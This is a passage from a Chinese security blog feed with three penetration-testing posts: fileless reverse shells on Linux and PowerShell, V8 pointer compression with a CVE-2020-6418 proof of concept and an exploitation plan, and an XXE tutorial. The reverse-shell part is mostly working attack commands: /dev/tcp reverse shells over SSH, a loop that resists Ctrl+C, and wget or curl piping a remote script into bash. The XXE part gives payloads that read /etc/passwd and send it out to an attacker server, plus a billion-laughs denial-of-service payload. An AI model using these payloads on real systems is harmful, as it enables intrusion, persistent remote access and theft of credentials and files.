([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()&#125;;$client.Close()&quot;</span><br></pre></td></tr></table></figure><p>此powershell命令是反向TCP Shell。从技术上讲，它在属于无文件恶意软件范畴。它可以直接从命令行或通过漏洞利用执行，功能和恶意软件无疑，Of course! 还有其他方法可以运行代码。这种小巧的Powershell是非常nice！的，防病毒产品没有机会扫描文件中的恶意代码，因为没有文件可扫描。除外，它还非常易于修改，混淆和添加功能。</p><h1 id="实战应用："><a href="#实战应用：" class="headerlink" title="实战应用："></a>实战应用：</h1><p>假如我们当前获得了一个ssh连接用户test的用户凭证（口令），那么我们可以这样做<br>首先在我们攻击监听一个端口。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nc -lvk 8888</span><br></pre></td></tr></table></figure><p>我们将在被攻击的主机上执行反向shell程序。在攻击机输入</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test@compromised.host &quot;bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;&lt;yourIP&gt;&#x2F;&lt;yourPort&gt; 0&gt;&amp;1&quot;</span><br></pre></td></tr></table></figure><p>这时候你将成功获得一个反向shell连接！</p><h5 id="再进一步："><a href="#再进一步：" class="headerlink" title="再进一步："></a>再进一步：</h5><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">#!&#x2F;bin&#x2F;bash</span><br><span class="line">trap &quot;:&quot; SIGINT SIGHUP</span><br><span class="line">while True; do</span><br><span class="line">    bash -i &gt;&amp; &#x2F;dev&#x2F;tcp&#x2F;10.0.0.1&#x2F;8080 0&gt;&amp;1</span><br><span class="line">    sleep 30</span><br><span class="line">Done</span><br></pre></td></tr></table></figure><p>这个shell脚本将30秒为我们执行一次有效负载，且屏蔽SIGINT信号，那么Ctrl+C也无法杀死！</p><blockquote><p>“SIGINT信息：程序终止(interrupt)信号, 在用户键入INTR字符(通常是Ctrl-C)时发出，用于通知前台进程组终止进程。”</p></blockquote><p>那么你会问这不就是一个shell脚本，一样会写入磁盘啊，一样会被发现的！<br>当然，所以我们接下来才是重点：各位看官请看<br>第一步优化：（直接执行命令）把sh脚本保存为test.sh放在我们自己的服务器上</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">whereis wget &amp;&amp; (wget -O - http:&#x2F;&#x2F;ip:8888&#x2F;test.sh | bash &amp;) || whereis curl &amp;&amp; (curl -o - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;)</span><br></pre></td></tr></table></figure><p>第二步优化，当然前面那样还是会留下些许痕迹！那么这样勒？</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ssh test@compromised.host &quot;whereis wget &amp;&amp; (wget -O - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;) || whereis curl &amp;&amp; (curl -o - http:&#x2F;&#x2F;localhost:8888&#x2F;test.sh | bash &amp;)&quot;</span><br></pre></td></tr></table></figure><p>从命令的复杂程度来看，是非常简单的，但是它从来没有碰过磁盘。这种无文件攻击的弊端就是一断电重启就哦豁了！因为代码驻留在内存中运行，当然这丝毫不影响它成为黑客攻击的</p>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 渗透 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>浅淡v8指针压缩</title>
      <link href="2020/09/21/%E6%B5%85%E6%B7%A1v8%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9/"/>
      <url>2020/09/21/%E6%B5%85%E6%B7%A1v8%E6%8C%87%E9%92%88%E5%8E%8B%E7%BC%A9/</url>
      
        <content type="html"><![CDATA[<blockquote><p>Pointer compression是v8 8.0中为提高64位机器内存利用率而引入的机制。</p></blockquote><h2 id="什么是Pointer-compression"><a href="#什么是Pointer-compression" class="headerlink" title="什么是Pointer compression"></a>什么是Pointer compression</h2><p>对于smi，在之前的64位系统中的表示是<code>value &lt;&lt; 32</code>，现在变成<code>value &lt;&lt; 1</code>（留一位做[pointer tagging]），这样smi从64位变为32位。</p><blockquote><p>“详情请参考：<a href="https://en.wikipedia.org/wiki/Tagged_pointer%E2%80%9D">https://en.wikipedia.org/wiki/Tagged_pointer”</a></p></blockquote><p>对于v8中64位的对象指针，它们的高32位基本是不变的，花费4字节来储存它们会浪费内存空间；所以指针压缩将64位对象指针变为32位，也就是64位指针中的低32位，将64位指针的高32位保存在r13中；访问对象时，只需要将对象指针与根寄存器的基址相加即可得到完整地址。</p><h2 id="v8关于指针压缩的实现"><a href="#v8关于指针压缩的实现" class="headerlink" title="v8关于指针压缩的实现"></a>v8关于指针压缩的实现</h2><p>首先我们能想到的实现方式是从0地址开始分配4G内存，确保v8对象分配在这4G内存范围内；v8显然没有这样做，在chrome渲染进程中可能会有多个v8实例，这个方案会导致所有v8实例都来竞争这4G内存，<del>而我们稍微开两个chrome内存就吃满了</del>。</p><blockquote><p>“详情请参考：<a href="https://v8.dev/blog/pointer-compression%E2%80%9D">https://v8.dev/blog/pointer-compression”</a></p></blockquote><h2 id="指针压缩在v8漏洞利用中的影响"><a href="#指针压缩在v8漏洞利用中的影响" class="headerlink" title="指针压缩在v8漏洞利用中的影响"></a>指针压缩在v8漏洞利用中的影响</h2><p>首先我们很难泄漏v8堆内存空间的高32位（r13寄存器），也就意味着我们用伪造JSArray并控制elements指针以获取任意r/w原语的时候只能在4G的堆内进行。</p><p>想要任意r/w原语我们可以在v8堆上分配ArrayBuffer并覆盖它的backing_store到任意64位内存地址，然后用TypedArray或DataView对象拿到整个64位地址空间内的任意r/w原语。原因是backing_store使用<a href="https://chromium.googlesource.com/chromium/src/+/dcc13470a/third_party/WebKit/Source/wtf/PartitionAlloc.md">PartitionAlloc</a>分配，所有PartitionAlloc分配的内存都位于v8堆之外的单独内存区域中，所以没有指针压缩。</p><p>还有BigUint64Array对象，利用它也可以实现v8堆内、堆外任意r/w；观察一下BigUint64Array对象的内存布局：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">sh</span><br><span class="line">DebugPrint: 0x192a080c5ed1: [JSTypedArray]</span><br><span class="line"> - map: 0x192a08280671 &lt;Map(BIGUINT64ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: 0x192a08242db1 &lt;Object map &#x3D; 0x192a08280699&gt;</span><br><span class="line"> - elements: 0x192a080c5eb9 &lt;ByteArray[16]&gt; [BIGUINT64ELEMENTS]</span><br><span class="line"> - embedder fields: 2</span><br><span class="line"> - buffer: 0x192a080c5e81 &lt;ArrayBuffer map &#x3D; 0x192a08281189&gt;</span><br><span class="line"> - byte_offset: 0</span><br><span class="line"> - byte_length: 16</span><br><span class="line"> - length: 2</span><br><span class="line"> - data_ptr: 0x192a080c5ec0</span><br><span class="line">   - base_pointer: 0x80c5eb9</span><br><span class="line">   - external_pointer: 0x192a00000007</span><br><span class="line"> - properties: 0x192a080406e9 &lt;FixedArray[0]&gt; &#123;&#125;</span><br><span class="line"> - elements: 0x192a080c5eb9 &lt;ByteArray[16]&gt; &#123;</span><br><span class="line">         0-1: 1311768465173141112</span><br><span class="line"> &#125;</span><br><span class="line"> - embedder fields &#x3D; &#123;</span><br><span class="line">0, aligned pointer: 0x0</span><br><span class="line">0, aligned pointer: 0x0</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure><p>可以看到external_pointer跟base_pointer都是没有进行指针压缩的64位指针，并且data_ptr是它俩相加，所以我们可以通过覆盖external_pointer和base_pointer实现64位内存空间任意r/w；还有一点要注意的是初始时external_pointer指针刚好是r13寄存器的高32位，我们可以通过泄露external_pointer来获得v8堆的基址（虽然好像也没有什么用）。</p><p>在类型混淆漏洞的利用中，当一个数组从smi/object转为double的时候，占用空间会翻倍，反之会减半。</p><h2 id="CVE-2020-6418"><a href="#CVE-2020-6418" class="headerlink" title="CVE-2020-6418"></a>CVE-2020-6418</h2><p>这个洞也是2020-SCTF浏览器题EasyMojo的v8部分。</p><h3 id="poc"><a href="#poc" class="headerlink" title="poc"></a>poc</h3><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">js</span><br><span class="line">&#x2F;&#x2F; Copyright 2020 the V8 project authors. All rights reserved.</span><br><span class="line">&#x2F;&#x2F; Use of this source code is governed by a BSD-style license that can be</span><br><span class="line">&#x2F;&#x2F; found in the LICENSE file.</span><br><span class="line">&#x2F;&#x2F; Flags: --allow-natives-syntax</span><br><span class="line">let a &#x3D; [0, 1, 2, 3, 4];</span><br><span class="line"></span><br><span class="line">function empty() &#123;&#125;</span><br><span class="line"></span><br><span class="line">function f(p) &#123;</span><br><span class="line">  a.pop(Reflect.construct(empty, arguments, p));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">let p &#x3D; new Proxy(Object, &#123;</span><br><span class="line">    get: () &#x3D;&gt; (a[0] &#x3D; 1.1, Object.prototype)</span><br><span class="line">&#125;);</span><br><span class="line"></span><br><span class="line">function main(p) &#123;</span><br><span class="line">  f(p);</span><br><span class="line">&#125;</span><br><span class="line">%PrepareFunctionForOptimization(empty);</span><br><span class="line">%PrepareFunctionForOptimization(f);</span><br><span class="line">%PrepareFunctionForOptimization(main);</span><br><span class="line">main(empty);</span><br><span class="line">main(empty);</span><br><span class="line">%OptimizeFunctionOnNextCall(main);</span><br><span class="line">main(p);</span><br></pre></td></tr></table></figure><p>jit没有考虑到a有side effect会变为double类型数组，仍按smi处理。</p><h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>考虑到指针压缩，我们基本利用思路就有了：<br>1.利用类型混淆把double数组变为object数组；<br>2.越界读写修改布置在后面的double数组的length字段；<br>3.有了任意长度越界的double数组，再找到布置在后面的BigUint64Array，通过越界写覆盖BigUint64Array的base_pointer和external_poiner字段来实现任意r/w原语；<br>4.利用任意r/w原语构造addrOf原语和fakeObj原语；<br>5.向wasm的rwx内存写入shellcode；</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">参考链接</span><br><span class="line">1.&lt;https:&#x2F;&#x2F;v8.dev&#x2F;blog&#x2F;pointer-compression&gt;</span><br><span class="line">2.&lt;https:&#x2F;&#x2F;blog.infosectcbr.com.au&#x2F;2020&#x2F;02&#x2F;pointer-compression-in-v8.html&gt;</span><br><span class="line">3.&lt;https:&#x2F;&#x2F;ray-cp.github.io&#x2F;archivers&#x2F;browser-pwn-cve-2020-6418%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90&gt;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Gamma实验室 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 二进制安全 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>一文学懂XXE漏洞，从0到1</title>
      <link href="2020/09/20/%E4%B8%80%E6%96%87%E5%AD%A6%E6%87%82XXE%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E0%E5%88%B01/"/>
      <url>2020/09/20/%E4%B8%80%E6%96%87%E5%AD%A6%E6%87%82XXE%E6%BC%8F%E6%B4%9E%EF%BC%8C%E4%BB%8E0%E5%88%B01/</url>
      
        <content type="html"><![CDATA[<h1 id="第一阶段（浅谈XML）"><a href="#第一阶段（浅谈XML）" class="headerlink" title="第一阶段（浅谈XML）"></a>第一阶段（浅谈XML）</h1><h2 id="初识XML"><a href="#初识XML" class="headerlink" title="初识XML"></a>初识XML</h2><p>一个好的代码基础能帮助你更好理解一类漏洞，所以先学习一下XML的基础知识。<br>XML被设计为传输和存储数据，其焦点是数据的内容，其把数据从HTML分离，是独立于软件和硬件的信息传输工具，简单来说XML主要是面向传输的。</p><p>什么是XML？<br>XML 指可扩展标记语言（EXtensible Markup Language）<br>XML 是一种标记语言，很类似 HTML<br>XML 的设计宗旨是传输数据，而非显示数据<br>XML 标签没有被预定义。您需要自行定义标签<br>XML 被设计为具有自我描述性<br>XML 是 W3C 的推荐标准</p><p>与HTML的对比<br>XML 不是 HTML 的替代<br>XML 和 HTML 为不同的目的而设计<br>XML 被设计为传输和存储数据，其焦点是数据的内容<br>HTML 被设计用来显示数据，其焦点是数据的外观<br>HTML 旨在显示信息，而 XML 旨在传输信息</p><h2 id="XML文档结构"><a href="#XML文档结构" class="headerlink" title="XML文档结构"></a>XML文档结构</h2><p>XML文档结构包括XML声明、DTD文档类型定义（可选）、文档元素。</p><p>请看示例：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">&lt;!--XML申明--&gt;</span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!--文档类型定义--&gt;</span><br><span class="line">&lt;!DOCTYPE note [  &lt;!--定义此文档是 note 类型的文档--&gt;</span><br><span class="line">&lt;!ELEMENT note (to,from,heading,body)&gt;  &lt;!--定义note元素有四个元素--&gt;</span><br><span class="line">&lt;!ELEMENT to (#PCDATA)&gt;     &lt;!--定义to元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT from (#PCDATA)&gt;   &lt;!--定义from元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT head (#PCDATA)&gt;   &lt;!--定义head元素为”#PCDATA”类型--&gt;</span><br><span class="line">&lt;!ELEMENT body (#PCDATA)&gt;   &lt;!--定义body元素为”#PCDATA”类型--&gt;</span><br><span class="line">]]]&gt;</span><br><span class="line">&lt;!--文档元素--&gt;</span><br><span class="line">&lt;note&gt;</span><br><span class="line">&lt;to&gt;wecome&lt;&#x2F;to&gt;</span><br><span class="line">&lt;from&gt;to&lt;&#x2F;from&gt;</span><br><span class="line">&lt;head&gt;This wave is hacker&lt;&#x2F;head&gt;</span><br><span class="line">&lt;body&gt;You are a good hacker&lt;&#x2F;body&gt;</span><br><span class="line">&lt;&#x2F;note&gt;</span><br></pre></td></tr></table></figure><h2 id="DTD："><a href="#DTD：" class="headerlink" title="DTD："></a>DTD：</h2><p>文档类型定义（DTD）可定义合法的XML文档构建模块，它使用一系列合法的元素来定义文档的结构。DTD 可被成行地声明于XML文档中（内部引用），也可作为一个外部引用。<br>DTD文档中有很多重要的关键字如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">o DOCTYPE（DTD的声明）</span><br><span class="line"></span><br><span class="line">o ENTITY（实体的声明）</span><br><span class="line"></span><br><span class="line">o SYSTEM、PUBLIC（外部资源申请）</span><br></pre></td></tr></table></figure><p>可以用如下语法引入外部DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 SYSTEM &quot;文件名&quot;&gt;</span><br></pre></td></tr></table></figure><p>可以用如下语法引用内部DTD</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE 根元素 [元素声明]&gt;</span><br></pre></td></tr></table></figure><h2 id="实体："><a href="#实体：" class="headerlink" title="实体："></a>实体：</h2><p>实体可以理解为变量，其必须在DTD中定义申明，可以在文档中的其他位置引用该变量的值。</p><p>实体按类型主要分为以下四种：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">o 内置实体 (Built-in entities)</span><br><span class="line"></span><br><span class="line">o 字符实体 (Character entities)</span><br><span class="line"></span><br><span class="line">o 通用实体 (General entities)</span><br><span class="line"></span><br><span class="line">o 参数实体 (Parameter entities)</span><br></pre></td></tr></table></figure><p>当然，如果实体根据引用方式，还可分为内部实体与外部实体。<br>完整的实体类别可参考 DTD - Entities</p><h2 id="四种实体引用实例"><a href="#四种实体引用实例" class="headerlink" title="四种实体引用实例"></a>四种实体引用实例</h2><h4 id="内部实体"><a href="#内部实体" class="headerlink" title="内部实体"></a>内部实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="参数实体"><a href="#参数实体" class="headerlink" title="参数实体"></a>参数实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br><span class="line">&lt;!ENTITY % 实体名称 &quot;实体的值&quot;&gt;</span><br></pre></td></tr></table></figure><h4 id="参数实体外实体-内部实体"><a href="#参数实体外实体-内部实体" class="headerlink" title="参数实体外实体+内部实体"></a>参数实体外实体+内部实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY name &quot;nMask&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;name;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><h4 id="参数实体-外部实体"><a href="#参数实体-外部实体" class="headerlink" title="参数实体+外部实体"></a>参数实体+外部实体</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE a [</span><br><span class="line">    &lt;!ENTITY % name SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;</span><br><span class="line">    %name;</span><br><span class="line">]&gt;</span><br></pre></td></tr></table></figure><h6 id="注意："><a href="#注意：" class="headerlink" title="注意："></a>注意：</h6><p>%name（参数实体）是在DTD中被引用的，而&amp;name（其余实体）是在xml文档中被引用的。<br>由于xxe漏洞主要是利用了DTD引用外部实体导致的漏洞，所以我们特别来分析外部实体</p><h3 id="外部实体"><a href="#外部实体" class="headerlink" title="外部实体"></a>外部实体</h3><p>定义</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY 实体名称 SYSTEM &quot;URI&quot;&gt;</span><br></pre></td></tr></table></figure><p>通过url可以引用哪些类型的外部实体？当然不同的程序语言，所支持的协议是不一样的</p><p>对照表：</p><p>案例演示：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE A [</span><br><span class="line">    &lt;!ENTITY Config SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;]&gt;</span><br><span class="line">&lt;foo&gt;</span><br><span class="line">        &lt;value&gt;&amp;Config;&lt;&#x2F;value&gt;</span><br><span class="line">&lt;&#x2F;foo&gt;</span><br></pre></td></tr></table></figure><h1 id="第二阶段（浅谈xxe漏洞"><a href="#第二阶段（浅谈xxe漏洞" class="headerlink" title="第二阶段（浅谈xxe漏洞)"></a>第二阶段（浅谈xxe漏洞)</h1><h2 id="XXE漏洞介绍："><a href="#XXE漏洞介绍：" class="headerlink" title="XXE漏洞介绍："></a>XXE漏洞介绍：</h2><p>XXE漏洞全称XML External Entity Injection即xml外部实体注入漏洞，XXE漏洞发生在应用程序解析XML输入时，没有禁止外部实体的加载，导致可加载恶意外部文件，造成文件读取、命令执行、内网端口扫描、攻击内网网站、发起dos攻击等危害。xxe漏洞触发的点往往是可以上传xml文件的位置，没有对上传的xml文件进行过滤，导致可上传恶意xml文件。此类攻击可能包括使用file：方案或系统标识符中的本地路径公开本地文件，其中可能包含敏感数据，例如密码或私人用户数据。由于此类攻击是相对于处理XML文档的应用程序而发生的，因此攻击者可能会使用此受信任的应用程序转到其他内部系统，可能通过http(s)请求公开其他内部内容或启动CSRF攻击任何不受保护的内部服务。在某些情况下，可以通过取消引用恶意URI来利用容易受到客户端内存损坏问题影响的XML处理器库，从而可能允许在应用程序帐户下执行任意代码。其他攻击可以访问可能不会停止返回数据的本地资源，如果未释放太多线程或进程，也可能会影响应用程序的可用性。</p><h6 id="注意：-1"><a href="#注意：-1" class="headerlink" title="注意："></a>注意：</h6><p>该应用程序无需显式将响应返回给攻击者，因为它很容易受到信息泄露的影响。攻击者可以利用DNS信息通过子域名将数据泄漏到他们控制的DNS服务器。</p><h1 id="第三阶段（发现xxe漏洞）"><a href="#第三阶段（发现xxe漏洞）" class="headerlink" title="第三阶段（发现xxe漏洞）"></a>第三阶段（发现xxe漏洞）</h1><h2 id="通过提交POST请求XML文件："><a href="#通过提交POST请求XML文件：" class="headerlink" title="通过提交POST请求XML文件："></a>通过提交POST请求XML文件：</h2><h6 id="注意：-2"><a href="#注意：-2" class="headerlink" title="注意："></a>注意：</h6><p>提交一个POST请求，请求头加上Content-type:application/xml</p><p>第一步，验证XML解析器是否解析和执行我们自定义的XML内容</p><p>发送payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;UTF-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY [  </span><br><span class="line">&lt;!ENTITY name &quot;hacker&quot;&gt;]&gt;    </span><br><span class="line">&lt;root&gt;&amp;name;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>如果服务器返回包成功解析了xml文档<br>将返回内容为hacker</p><p>第二步，是否支持外部实体的引用。</p><p>利用步骤：</p><ol><li>自建web网站</li><li>在测试网站提交payload</li></ol><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE test [&lt;!ENTITY dtgmlf6ent SYSTEM &quot;http:&#x2F;&#x2F;自己网站ip&#x2F;文件名&quot;&gt;]&gt;  </span><br><span class="line">&lt;GeneralSearch&gt;&amp;test;&lt;&#x2F;GeneralSearch&gt;</span><br></pre></td></tr></table></figure><ol><li>查看网站返回内容中是否带有自建网站文件中的内容</li><li>查看自建服务器访问日志，是否有DTD文件等请求</li></ol><h1 id="第四阶段（xxe漏洞利用）"><a href="#第四阶段（xxe漏洞利用）" class="headerlink" title="第四阶段（xxe漏洞利用）"></a>第四阶段（xxe漏洞利用）</h1><h2 id="1-任意文件读取："><a href="#1-任意文件读取：" class="headerlink" title="1. 任意文件读取："></a>1. 任意文件读取：</h2><p>Payload（有回显）</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot; encoding&#x3D;&quot;utf-8&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE foo [</span><br><span class="line">&lt;!ENTITY xxe SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot; &gt;</span><br><span class="line">]&gt;</span><br><span class="line">&lt;root&gt;&lt;name&gt;&amp;xxe;&lt;&#x2F;name&gt;&lt;&#x2F;root&gt;</span><br></pre></td></tr></table></figure><p>这里通过外带（OOB）的方法来检测（无回显）</p><p>①自建web服务器<br>②创建接受数据的文件readdata.php</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">file_put_contents(&quot;passwd.txt&quot;, $_GET[&#39;file&#39;]) ;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>③创建hacker.php来供外部实体引用</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php  </span><br><span class="line">$xml&#x3D;&lt;&lt;&lt;EOF  </span><br><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;  </span><br><span class="line">&lt;!DOCTYPE ANY[  </span><br><span class="line">&lt;!ENTITY % file SYSTEM &quot;file:&#x2F;&#x2F;&#x2F;etc&#x2F;passwd&quot;&gt;  &#x2F;&#x2F;被攻击的服务器</span><br><span class="line">&lt;!ENTITY % remote SYSTEM &quot;http:&#x2F;&#x2F;localhost&#x2F;hacker.xml&quot;&gt;  &#x2F;&#x2F;自建服务器</span><br><span class="line">%remote;</span><br><span class="line">%all;</span><br><span class="line">%send;  </span><br><span class="line">]&gt;  </span><br><span class="line">EOF;  </span><br><span class="line">$data &#x3D; simplexml_load_string($xml) ;  </span><br><span class="line">echo &quot;&lt;pre&gt;&quot; ;  </span><br><span class="line">print_r($data) ;  </span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p>④创建hacker.xml</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &#39;http:&#x2F;&#x2F;localhost&#x2F;readdata.php?file&#x3D;%file;&#39;&gt;&quot;&gt;</span><br></pre></td></tr></table></figure><p>当访问<a href="http://localhost/hacker.php">http://localhost/hacker.php</a>, 存在漏洞的服务器会读出/etc/passwd内容，发送给攻击者服务器上的hacker.php，然后把读取的数据保存到本地的passwd.txt中。</p><h2 id="2-DOS攻击："><a href="#2-DOS攻击：" class="headerlink" title="2. DOS攻击："></a>2. DOS攻击：</h2><p>著名的“billion laughs”就是利用了XXE<br>通过递归调用<br>Payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?xml version&#x3D;&quot;1.0&quot;?&gt;</span><br><span class="line">&lt;!DOCTYPE lolz [</span><br><span class="line">&lt;!ENTITY lol &quot;lol&quot;&gt;</span><br><span class="line">&lt;!ENTITY lol2 